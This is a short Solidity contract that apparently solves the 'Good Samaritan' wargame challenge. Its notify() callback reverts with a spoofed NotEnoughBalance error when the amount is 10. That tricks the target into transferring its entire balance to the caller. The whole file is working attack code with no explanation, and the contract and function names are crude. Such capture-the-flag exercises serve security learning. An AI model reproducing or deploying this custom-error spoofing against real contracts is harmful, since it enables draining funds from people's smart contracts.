// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBlance);
}

contract FuckGoodSamaritan {
    IGoodSamaritan goodSamaritan;

    error NotEnoughBalance();

    constructor(address _address) {
        goodSamaritan = IGoodSamaritan(_address);
    }

    function fuck() public {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
